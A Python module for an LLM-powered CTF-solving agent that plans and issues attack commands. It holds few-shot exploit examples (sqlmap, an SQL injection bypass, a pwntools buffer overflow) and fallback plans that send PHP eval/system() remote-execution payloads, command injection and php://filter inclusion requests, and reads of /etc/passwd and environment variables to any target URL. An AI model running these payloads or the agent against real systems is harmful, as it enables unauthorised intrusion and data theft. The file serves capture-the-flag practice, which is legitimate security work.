"""
Planner - Task Planning Module (Optimized)

Enhanced with better prompting, few-shot examples, structured output,
async LLM calls, multi-provider support (MiMo, MiniMax, etc.),
and automatic fallback model switching.
"""

import json
import logging
import asyncio
import re
import shlex
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin

logger = logging.getLogger(__name__)

# Model name aliases: friendly name → API slug
MODEL_ALIASES = {
    # MiMo series
    "mimo-v2.5-pro": "mimo-v2.5-pro",
    "mimo-v2.5": "mimo-v2.5",
    "mimo-v2-pro": "mimo-v2-pro",
    "mimo-v2-omni": "mimo-v2-omni",
    "mimo-v2-flash": "mimo-v2-flash",
    # MiniMax series
    "minimax-text-01": "MiniMax-Text-01",
    "minimax-m1": "MiniMax-M1",
    "minimax-m2": "MiniMax-M2",
    "minimax-m2.7": "MiniMax-M2.7",
}

# Default base URLs for providers that have built-in endpoints
PROVIDER_DEFAULTS = {
    "mimo": {"base_url": "https://api.xiaomimimo.com/v1"},
    "minimax": {"base_url": "https://api.minimax.chat/v1"},
    "minimax-cn": {"base_url": "https://api.minimaxi.com/v1"},
    "deepseek": {"base_url": "https://api.deepseek.com/v1"},
    "ollama": {"base_url": "http://localhost:11434/v1"},
}


@dataclass
class Action:
    """A single action to be executed."""
    tool: str
    command: str
    args: dict = field(default_factory=dict)
    description: str = ""
    priority: int = 0
    depends_on: Optional[str] = None  # Tool dependency


@dataclass
class Plan:
    """A plan consisting of multiple actions."""
    reasoning: str
    actions: list[Action] = field(default_factory=list)
    confidence: float = 0.0
    strategy: str = ""
    alternative_plans: list[str] = field(default_factory=list)


# Few-shot examples for each category
FEW_SHOT_EXAMPLES = {
    "web": """
Example - SQL Injection:
Challenge: Login form at http://target.com/login
Analysis: Login form likely vulnerable to SQL injection. Test with basic payloads.
Actions:
1. curl -s http://target.com/login (inspect form)
2. sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch (automated SQLi)
3. curl -s "http://target.com/login" --data "user=admin'--&pass=x" (manual bypass)
""",

    "crypto": """
Example - Weak RSA:
Challenge: RSA with small e and factorable n
Analysis: n can be factored using factordb or Fermat's method.
Actions:
1. python3 -c "import math; n=...; [print(i) for i in range(2,int(math.sqrt(n))+1) if n%i==0]" (factor)
2. python3 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(pow(c,d,n)))" (decrypt)
""",

    "pwn": """
Example - Buffer Overflow:
Challenge: Binary with gets() call, NX enabled
Analysis: Classic stack buffer overflow. Need to find offset and overwrite return address.
Actions:
1. checksec --file=./vuln (check protections)
2. python3 -c "from pwn import *; print(cyclic(100))" (generate pattern)
3. gdb -q ./vuln -ex "run <<< $(python3 -c 'print(cyclic(100))')" -ex "info registers rsp" (find offset)
4. python3 -c "from pwn import *; p=remote('target',1337); p.sendline(b'A'*offset+p64(win_addr)); p.interactive()" (exploit)
""",

    "reverse": """
Example - Crackme:
Challenge: Binary asks for serial key
Analysis: Need to reverse the validation algorithm.
Actions:
1. file ./crackme (identify binary type)
2. strings ./crackme | grep -i key (look for strings)
3. r2 -q -c "aaa; s sym.check; pdf" ./crackme (disassemble validation)
4. python3 -c "reverse_engineered_algorithm()" (generate key)
""",

    "forensics": """
Example - Memory Dump:
Challenge: Find password in memory dump
Analysis: Use volatility to extract process memory and credentials.
Actions:
1. file dump.mem (identify file type)
2. vol.py -f dump.mem imageinfo (identify OS profile)
3. vol.py -f dump.mem --profile=... pslist (list processes)
4. vol.py -f dump.mem --profile=... dumpfiles -D output (extract files)
""",
}

PLANNER_SYSTEM_PROMPT = """You are an elite CTF (Capture The Flag) challenge solver with deep expertise in cybersecurity.
Your role is to analyze challenges and create precise, actionable solving strategies.

## Your Expertise
- Web Application Security (SQLi, XSS, SSRF, authentication bypass)
- Cryptography (RSA, AES, classical ciphers, hash cracking)
- Binary Exploitation (buffer overflow, ROP, format strings, heap)
- Reverse Engineering (disassembly, decompilation, anti-debug)
- Digital Forensics (memory analysis, network captures, steganography)

## Available Tools
| Tool | Category | Best For |
|------|----------|----------|
| curl | web | HTTP requests, response inspection |
| sqlmap | web | Automated SQL injection |
| nikto | web | Web server scanning |
| gobuster | web | Directory enumeration |
| ffuf | web | Web fuzzing |
| nmap | network | Port scanning, service detection |
| gdb | pwn | Debugging, exploit development |
| ropper | pwn | ROP gadget finding |
| checksec | pwn | Binary security analysis |
| radare2 | reverse | Disassembly, analysis |
| binwalk | forensics | Firmware extraction |
| steghide | forensics | Steganography |
| exiftool | forensics | Metadata extraction |
| volatility | forensics | Memory forensics |
| openssl | crypto | Cryptographic operations |
| john | crypto | Password cracking |
| python3 | misc | Custom scripts, calculations |
| bash | misc | Shell commands, piping |

## Response Format
Output ONLY valid JSON:
{
    "reasoning": "Step-by-step analysis of the challenge. What type is it? What vulnerabilities might exist? What's the attack surface?",
    "strategy": "strategy_name (e.g., 'sql_injection_exploit', 'buffer_overflow', 'rsa_factorization')",
    "confidence": 0.0-1.0,
    "alternative_plans": ["fallback strategy 1", "fallback strategy 2"],
    "actions": [
        {
            "tool": "tool_name",
            "command": "exact command to run",
            "args": {},
            "description": "what this step does and why",
            "priority": 1,
            "depends_on": null
        }
    ]
}

## Rules
1. Start with reconnaissance, then analysis, then exploitation
2. Each action should be a single, concrete command
3. Prioritize automated tools over manual commands
4. Include fallback approaches in alternative_plans
5. Be specific - use actual URLs, file names, and parameters from the challenge
"""


class Planner:
    """LLM-powered task planner with async support and few-shot learning."""

    def __init__(
        self,
        model: str = "gpt-4o",
        provider: str = "openai",
        api_key: Optional[str] = None,
        base_url: Optional[str] = None,
        temperature: float = 0.1,
        max_tokens: int = 4096,
    ):
        self.model = model
        self.provider = provider
        self.api_model = self._normalize_model_name(model, provider)
        self.api_key = api_key
        self.base_url = self._resolve_base_url(provider, base_url)
        self.temperature = temperature
        self.max_tokens = max_tokens
        self._client = None
        self._llm_disabled_reason: Optional[str] = None
        self._model_unsupported: bool = False

    @staticmethod
    def _normalize_model_name(model: str, provider: str) -> str:
        """Normalize friendly model names to provider API slugs."""
        normalized = (model or "").strip()
        lower = normalized.lower()
        # Check alias table first
        if lower in MODEL_ALIASES:
            return MODEL_ALIASES[lower]
        # Auto-lowercase mimo- prefixed names
        if lower.startswith("mimo-"):
            return lower
        # For mimo/openai-compatible provider with mimo in name
        if provider in {"mimo", "openai-compatible"} and "mimo" in lower:
            return lower
        return normalized

    @staticmethod
    def _resolve_base_url(provider: str, base_url: Optional[str]) -> Optional[str]:
        """Resolve base URL: explicit > provider default > None."""
        if base_url and isinstance(base_url, str) and base_url.strip():
            return base_url.rstrip("/")
        defaults = PROVIDER_DEFAULTS.get(provider, {})
        return defaults.get("base_url")

    def _get_client(self):
        if self._client is None:
            if self.provider == "openai":
                from openai import OpenAI
                kwargs = {"api_key": self.api_key}
                if self.base_url:
                    kwargs["base_url"] = self.base_url
                self._client = OpenAI(**kwargs)
            elif self.provider == "anthropic":
                import anthropic
                self._client = anthropic.Anthropic(api_key=self.api_key)
            elif self.provider in {"deepseek", "ollama"}:
                from openai import OpenAI
                self._client = OpenAI(api_key=self.api_key or "ollama", base_url=self.base_url)
            elif self.provider in {"openai-compatible", "mimo"}:
                from openai import OpenAI
                if not self.base_url:
                    raise ValueError(f"provider '{self.provider}' requires llm.base_url")
                self._client = OpenAI(api_key=self.api_key, base_url=self.base_url)
            elif self.provider in {"minimax", "minimax-cn"}:
                from openai import OpenAI
                if not self.base_url:
                    raise ValueError(f"provider '{self.provider}' requires llm.base_url")
                self._client = OpenAI(api_key=self.api_key, base_url=self.base_url)
            else:
                raise ValueError(f"Unsupported provider: {self.provider}")
        return self._client

    def _build_prompt(self, challenge_url, challenge_text, category, context, previous_steps):
        """Build a rich prompt with few-shot examples."""
        few_shot = FEW_SHOT_EXAMPLES.get(category, "")

        recent_steps = previous_steps[-15:] if previous_steps else []
        steps_text = "\n".join(recent_steps) if recent_steps else "None (first iteration)"

        return f"""## Challenge
Category: {category}
URL: {challenge_url or 'N/A'}
Description: {challenge_text or 'N/A'}

## Context from Memory
{context or 'No prior context'}

## Steps Already Taken
{steps_text}

{f'## Reference Example{chr(10)}{few_shot}' if few_shot else ''}

Analyze this challenge and provide the NEXT set of actions to progress toward the flag.
If previous steps failed, try a DIFFERENT approach. Be specific and actionable.
Output ONLY valid JSON."""

    def _call_llm(self, system_prompt: str, user_prompt: str) -> str:
        client = self._get_client()
        if self.provider == "anthropic":
            response = client.messages.create(
                model=self.api_model, max_tokens=self.max_tokens, temperature=self.temperature,
                system=system_prompt,
                messages=[{"role": "user", "content": user_prompt}],
            )
            return response.content[0].text
        else:
            response = client.chat.completions.create(
                model=self.api_model, temperature=self.temperature, max_tokens=self.max_tokens,
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_prompt},
                ],
            )
            return response.choices[0].message.content

    async def async_call_llm(self, system_prompt: str, user_prompt: str) -> str:
        """Async LLM call using thread pool."""
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._call_llm, system_prompt, user_prompt)

    def plan(self, challenge_url=None, challenge_text=None, category="unknown",
             context="", previous_steps=None) -> Plan:
        """Sync plan generation."""
        user_prompt = self._build_prompt(challenge_url, challenge_text, category, context, previous_steps or [])
        if self._llm_disabled_reason:
            return self._fallback_plan(challenge_url, self._llm_disabled_reason, category, previous_steps)
        try:
            response = self._call_llm(PLANNER_SYSTEM_PROMPT, user_prompt)
            return self._parse_plan(response)
        except Exception as e:
            logger.error(f"Planner error: {e}")
            self._disable_llm_if_auth_error(e)
            return self._fallback_plan(challenge_url, e, category, previous_steps)

    async def async_plan(self, challenge_url=None, challenge_text=None, category="unknown",
                         context="", previous_steps=None) -> Plan:
        """Async plan generation."""
        user_prompt = self._build_prompt(challenge_url, challenge_text, category, context, previous_steps or [])
        if self._llm_disabled_reason:
            return self._fallback_plan(challenge_url, self._llm_disabled_reason, category, previous_steps)
        try:
            response = await self.async_call_llm(PLANNER_SYSTEM_PROMPT, user_prompt)
            return self._parse_plan(response)
        except Exception as e:
            logger.error(f"Planner error: {e}")
            self._disable_llm_if_auth_error(e)
            return self._fallback_plan(challenge_url, e, category, previous_steps)

    def _parse_plan(self, response: str) -> Plan:
        """Parse LLM response into a Plan object."""
        response = response.strip()

        # Strip <think>...</think> blocks (MiniMax, MiMo reasoning models)
        response = re.sub(r"<think>.*?</think>", "", response, flags=re.DOTALL).strip()

        # Strip markdown code blocks
        if response.startswith("```"):
            lines = response.split("\n")
            response = "\n".join(lines[1:-1] if lines[-1].strip() == "```" else lines[1:])

        data = json.loads(response)
        actions = []
        for a in data.get("actions", []):
            actions.append(Action(
                tool=a.get("tool", "bash"),
                command=a.get("command", ""),
                args=a.get("args", {}),
                description=a.get("description", ""),
                priority=a.get("priority", 0),
                depends_on=a.get("depends_on"),
            ))

        return Plan(
            reasoning=data.get("reasoning", ""),
            actions=actions,
            confidence=data.get("confidence", 0.5),
            strategy=data.get("strategy", "general"),
            alternative_plans=data.get("alternative_plans", []),
        )

    def _disable_llm_if_auth_error(self, error) -> None:
        text = str(error).lower()
        # Authentication errors → permanently disable LLM
        auth_markers = (
            "401",
            "unauthorized",
            "incorrect api key",
            "invalid_api_key",
            "authentication",
        )
        if any(marker in text for marker in auth_markers):
            self._llm_disabled_reason = (
                f"LLM authentication failed for provider '{self.provider}'. "
                f"Check API key or switch provider."
            )
            return
        # Model not supported → mark for fallback, do NOT disable LLM entirely
        if "not supported model" in text or "unsupported model" in text:
            self._model_unsupported = True
            logger.warning(
                f"Model '{self.api_model}' not supported by {self.provider} endpoint. "
                f"Fallback should be triggered."
            )
            return

    def _fallback_plan(self, url, error, category: str = "unknown", previous_steps=None) -> Plan:
        """Fallback plan when LLM fails. Smarter: detects RCE and chains exploitation."""
        previous_steps = previous_steps or []
        steps_text = "\n".join(previous_steps)

        # Check if RCE was already confirmed in previous steps
        rce_confirmed = "CTF_AGENT_RCE" in steps_text

        if rce_confirmed and url:
            # RCE confirmed → extract flags from common locations
            quoted_url = shlex.quote(url)
            flag_payload = (
                'a=echo "CTF_AGENT_FLAG_SCAN:"; '
                'cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; '
                'cat /var/www/flag* 2>/dev/null; cat /var/www/html/flag* 2>/dev/null; '
                'cat /var/www/html/get_flag.php 2>/dev/null; '
                'find / -maxdepth 3 -name "flag*" -readable 2>/dev/null | head -10; '
                'find / -maxdepth 3 -name "*flag*" -readable 2>/dev/null | head -10; '
                'env | grep -i flag 2>/dev/null; '
                'cat /etc/passwd 2>/dev/null'
            )
            source_payload = (
                'a=echo "CTF_AGENT_SOURCE:"; '
                'cat /var/www/html/index.php 2>/dev/null; '
                'cat /var/www/html/get_flag.php 2>/dev/null; '
                'ls -laR /var/www/html/ 2>/dev/null'
            )
            return Plan(
                reasoning="RCE confirmed from previous steps. Extracting flags from common locations.",
                actions=[
                    Action(
                        tool="curl",
                        command=f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(flag_payload)} {quoted_url}",
                        description="Extract flags from common CTF locations after confirmed RCE",
                    ),
                    Action(
                        tool="curl",
                        command=f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(source_payload)} {quoted_url}",
                        description="Read source code to find hidden flag logic",
                    ),
                ],
                confidence=0.6,
                strategy="rce_flag_extraction",
            )

        # Check if basic recon already ran
        already_recon = any("[Plan]" in s and "fallback reconnaissance" in s for s in previous_steps)
        if already_recon:
            # Recon done, try more aggressive approaches based on what we found
            actions = []
            if url:
                quoted_url = shlex.quote(url)
                # Try common web vulns
                if category == "web":
                    actions.extend([
                        Action(
                            tool="curl",
                            command=f"curl -s --max-time 10 {shlex.quote(url.rstrip('/') + '/index.php')} | head -200",
                            description="Check index.php directly",
                        ),
                        Action(
                            tool="curl",
                            command=f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote('a=system(\"id\");')} {quoted_url}",
                            description="Try PHP system() via POST 'a' parameter",
                        ),
                        Action(
                            tool="curl",
                            command=(
                                f"curl -s --max-time 10 {shlex.quote(url.rstrip('/') + '/?cmd=id')}"
                            ),
                            description="Try GET parameter 'cmd' for command injection",
                        ),
                        Action(
                            tool="curl",
                            command=(
                                f"curl -s --max-time 10 "
                                f"{shlex.quote(url.rstrip('/') + '/index.php?page=php://filter/convert.base64-encode/resource=index')}"
                            ),
                            description="Try PHP LFI with php://filter wrapper",
                        ),
                    ])
            if actions:
                return Plan(
                    reasoning="Fallback recon done. Trying more aggressive web exploitation approaches.",
                    actions=actions,
                    confidence=0.3,
                    strategy="fallback_aggressive",
                )
            return Plan(
                reasoning=(
                    f"{error}; fallback reconnaissance already ran and no new "
                    f"deterministic actions are available without a working LLM."
                ),
                actions=[],
                confidence=0.0,
                strategy="fallback_exhausted",
            )

        # First fallback: basic reconnaissance
        actions = []
        if url:
            quoted_url = shlex.quote(url)
            probe_payload = 'a=echo "CTF_AGENT_PROBE";'
            rce_payload = (
                'a=echo "CTF_AGENT_RCE:"; '
                'system("id; pwd; ls -la; cat /flag 2>/dev/null; cat flag 2>/dev/null; '
                'cat flag.php 2>/dev/null; cat get_flag.php 2>/dev/null");'
            )
            post_probe = f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(probe_payload)} {quoted_url}"
            post_rce = f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(rce_payload)} {quoted_url}"
            robots_url = shlex.quote(urljoin(url.rstrip("/") + "/", "robots.txt"))
            flag_url = shlex.quote(urljoin(url.rstrip("/") + "/", "flag.txt"))
            actions.append(Action(
                tool="curl", command=f"curl -s -I -L --max-time 10 {quoted_url}",
                description="HTTP header inspection",
            ))
            actions.append(Action(
                tool="curl", command=f"curl -s --max-time 10 {quoted_url} | head -200",
                description="Page content inspection",
            ))
            if category == "web":
                actions.extend([
                    Action(
                        tool="curl", command=post_probe,
                        description="Probe common PHP eval POST parameter 'a'",
                    ),
                    Action(
                        tool="curl", command=post_rce,
                        description="Exploit visible PHP eval($_POST['a']) sink to read common flag paths",
                    ),
                    Action(
                        tool="curl", command=f"curl -s --max-time 10 {robots_url}",
                        description="Check robots.txt for hidden paths",
                    ),
                    Action(
                        tool="curl", command=f"curl -s --max-time 10 {flag_url}",
                        description="Probe a common CTF flag path",
                    ),
                ])
        return Plan(
            reasoning=f"LLM error ({error}), using fallback reconnaissance",
            actions=actions, confidence=0.1, strategy="fallback",
        )
